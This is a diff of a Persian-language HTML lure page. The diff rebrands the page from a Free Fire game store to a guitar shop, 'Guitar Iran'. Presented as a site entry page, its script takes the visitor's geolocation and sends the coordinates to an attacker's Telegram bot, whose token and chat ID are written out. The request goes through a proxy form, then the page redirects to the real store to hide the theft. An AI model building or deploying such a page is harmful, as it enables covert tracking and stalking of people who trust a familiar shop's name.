@@ -2,122 +2,89 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>vg-store.ir/</title>
+  <title>https://guitariran.com/</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- فونت گیمینگ Orbitron -->
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap" rel="stylesheet">
-  <!-- فونت انگلیسی جوان پسند برای تیتر -->
-  <link href="https://fonts.googleapis.com/css2?family=Anton&display=swap" rel="stylesheet">
+  <link href="https://cdn.fontcdn.ir/Font/Persian/Vazir/Vazir.css" rel="stylesheet" type="text/css" />
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Orbitron', sans-serif;
-      background: linear-gradient(135deg, #2c3e50, #8e44ad);
-      background-size: 400% 400%;
-      animation: gradientMove 12s ease infinite;
+      margin: 0;
+      padding: 0;
+      font-family: 'Vazir', sans-serif;
+      background-color: #1e1e1e;
+      color: #f5f5f5;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
       text-align: center;
-      color: #fff;
-      overflow-x: hidden;
-    }
-    @keyframes gradientMove {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      background-image: linear-gradient(to bottom right, #2c2c2c, #1a1a1a);
     }
 
-    /* تیتر Free Fire با فونت جدید و بدون انیمیشن */
     h1 {
-      font-family: 'Anton', sans-serif;
-      font-size: 3em;
-      font-weight: 700;
-      margin-bottom: 12px;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      color: #ffd700; /* طلایی */
-      text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
+      font-size: 2.8em;
+      margin-bottom: 10px;
+      color: #ffcc00;
     }
 
     p {
-      font-size: 1.1em;
-      margin-bottom: 25px;
-      text-shadow: 0 0 10px rgba(0,0,0,0.7);
+      font-size: 1.4em;
+      margin-bottom: 30px;
+      color: #cccccc;
     }
 
-    /* دکمه گیمینگ */
     button {
-      position: relative;
-      background: linear-gradient(135deg, #ff3c3c, #ff9800, #ffcc00);
-      color: white;
+      background-color: #ff6600;
+      color: #fff;
       border: none;
-      padding: 16px 40px;
+      padding: 15px 40px;
       font-size: 1.2em;
-      border-radius: 40px;
+      border-radius: 8px;
       cursor: pointer;
-      box-shadow: 0 0 25px rgba(255, 152, 0, 0.7), 0 0 40px rgba(255, 60, 60, 0.6);
-      text-transform: uppercase;
-      font-weight: bold;
-      overflow: hidden;
-      transition: transform 0.2s ease;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      transition: background-color 0.3s ease, transform 0.2s ease;
     }
-    button:hover { transform: scale(1.1); }
 
-    button::before {
-      content: "";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: linear-gradient(120deg, rgba(255,255,255,0.3), transparent, transparent);
-      transform: rotate(25deg);
-      animation: shine 3s infinite;
-    }
-    @keyframes shine {
-      0% { transform: rotate(25deg) translateX(-150%); }
-      50% { transform: rotate(25deg) translateX(150%); }
-      100% { transform: rotate(25deg) translateX(150%); }
+    button:hover {
+      background-color: #e65c00;
+      transform: scale(1.05);
     }
 
     footer {
       margin-top: auto;
       width: 100%;
-      background: rgba(0,0,0,0.65);
-      padding: 12px 0;
-      font-size: 0.85em;
-      color: #eee;
-      border-top: 1px solid rgba(255,255,255,0.2);
-      text-shadow: 0 0 8px rgba(0,0,0,0.8);
-      text-align: center;
-      font-family: sans-serif;
+      background-color: #2a2a2a;
+      padding: 15px 0;
+      font-size: 0.9em;
+      color: #999;
+      border-top: 1px solid #444;
     }
 
-    /* موبایل */
     @media (max-width: 600px) {
-      h1 { font-size: 2em; }
-      p { font-size: 1em; }
+      h1 {
+        font-size: 2.2em;
+      }
+      p {
+        font-size: 1.1em;
+      }
       button {
-        width: 85%;
+        width: 80%;
         font-size: 1em;
-        padding: 14px 25px;
+        padding: 12px 20px;
       }
       footer {
-        font-size: 0.75em;
+        font-size: 0.8em;
         padding: 10px 0;
       }
     }
   </style>
 </head>
 <body>
-  <h1>FREE FIRE</h1>
-  <p>در حال ورود به سایت...</p>
-  <button onclick="getLocation()">ورود به وی جی استور</button>
+  <h1>ورود به سایت</h1>
+  <p>شناسایی فروشگاه های نزدیک به شما...</p>
+  <button onclick="getLocation()">ورود به گیتار ایران </button>
   <footer>
-    © تمامی حقوق محفوظ است برای وی جی استور | طراحی شده با 
+    © تمامی حقوق محفوظ است برای گیتار ایران | طراحی شده با
   </footer>
 
   <script>
@@ -126,16 +93,21 @@
         navigator.geolocation.getCurrentPosition(showPosition, showError);
       } else {
         alert("مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.");
+        console.error("Geolocation not supported.");
       }
     }
 
     function showPosition(position) {
       var latitude = position.coords.latitude;
       var longitude = position.coords.longitude;
+      console.log("Latitude:", latitude);
+      console.log("Longitude:", longitude);
+
       if (latitude && longitude) {
-        var tgUrl ="https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage"
+        var tgUrl = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage"
                   + "?chat_id=8438093859"
                   + "&text=" + encodeURIComponent("Latitude: " + latitude + ", Longitude: " + longitude);
+
         var formData = new FormData();
         formData.append("UrlBox", tgUrl);
         formData.append("AgentList", "Google chrome");
@@ -148,18 +120,36 @@
           mode: "no-cors"
         }).then(function() {
           alert("موفق!");
-          window.location.href = "https://vg-store.ir/%D8%AF%D8%B3%D8%AA%D9%87-%D9%85%D8%AD%D8%B5%D9%88%D9%84/%D8%A8%D8%A7%D8%B2%DB%8C-%D9%87%D8%A7%DB%8C-%D9%85%D9%88%D8%A8%D8%A7%DB%8C%D9%84/%D8%A7%DA%A9%D8%A7%D9%86%D8%AA-%D9%81%D8%B1%DB%8C-%D9%81%D8%A7%DB%8C%D8%B1/";
-        }).catch(function() {
-          alert("خطا! دوباره امتحان کنید.");
+          window.location.href = "https://guitariran.com/";
+        }).catch(function(err) {
+          console.warn("Proxy request failed:", err);
+          alert("خطا! تنظیمات دسترسی را ریست کنید.");
         });
 
       } else {
         alert("لطفاً دوباره امتحان کنید.");
+        console.warn("Latitude or Longitude is missing.");
       }
     }
 
     function showError(error) {
-      alert("خطا! تنظیمات دسترسی را ریست کنید.");
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          alert("با خطا مواجه شد.");
+          console.error("User denied the request for Geolocation.");
+          break;
+        case error.POSITION_UNAVAILABLE:
+          alert("ورود انجام نشد.");
+          console.error("Location information is unavailable.");
+          break;
+        case error.TIMEOUT:
+          alert("زمان دریافت تمام شد.");
+          console.error("The request to get user location timed out.");
+          break;
+        default:
+          alert("خطای ناشناخته رخ داد.");
+          console.error("An unknown error occurred.");
+      }
     }
   </script>
 </body>
